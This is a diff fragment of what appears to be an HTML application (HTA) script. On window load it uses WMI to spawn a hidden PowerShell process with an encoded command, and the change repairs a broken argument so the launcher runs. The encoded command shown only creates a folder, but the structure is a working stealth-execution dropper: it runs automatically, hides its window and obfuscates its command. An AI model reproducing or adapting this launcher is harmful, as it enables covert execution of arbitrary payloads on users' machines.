@@ -11,7 +11,7 @@ Sub window_onload
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set Process = Service.Get("Win32_Process")
-        Error = Process.Create("powershell -nop -w hidden -enc bWtkaXIgYzpcaG9vCg==", nu                                                ll, objConfig, intProcessID)
+        Error = Process.Create("powershell -nop -w hidden -enc bWtkaXIgYzpcaG9vCg==", null, objConfig, intProcessID)
         window.close()
 end sub
 </script>
